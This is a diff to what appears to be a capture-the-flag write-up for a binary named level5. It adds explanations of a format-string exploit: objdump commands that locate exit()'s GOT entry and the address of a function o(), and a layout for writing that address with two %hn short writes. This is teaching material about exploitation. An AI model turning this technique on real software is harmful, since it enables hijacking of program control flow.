@@ -64,14 +64,17 @@ The goal here will be to overwrite the address of exit() in the GOT with the add
 Let’s find the address of exit() and o()
 
 ```shell
+# Get exit-syscall address
 objdump -R ~/level5 | grep exit
-
 > 08049828 R_386_JUMP_SLOT   _exit
   08049838 R_386_JUMP_SLOT   exit
 
+# Get o-function address
 objdump -t ~/level5 | grep -w o
 > 080484a4 g     F .text  0000001e              o
 ```
+
+It means we want to write the value `0x080484a4` at the address of exit: `0x08049838`
 
 We need to know the buffer address.
 
@@ -88,6 +91,21 @@ gdb-peda$ run <<< AAAA
 ```
 
 The buffer pointer is 4 addresses before the printf argument.
+
+As `0x080484a4` is a big value, instead of print this value, we will split this integer with two short integers:
+
+- High-order bytes: `0x0804`
+- Low-order bytes: `0x84a4`
+
+Basically, our format string should be something like:
+
+```
+   ______________________________________
+   |                                    |
+ADDRESS_1 + ADDRESS_2 + %<VALUE_1>x + %4$hn +  %<VALUE_2>x + %5$hn
+                |______________________________________________|
+
+```
 
 ---
 
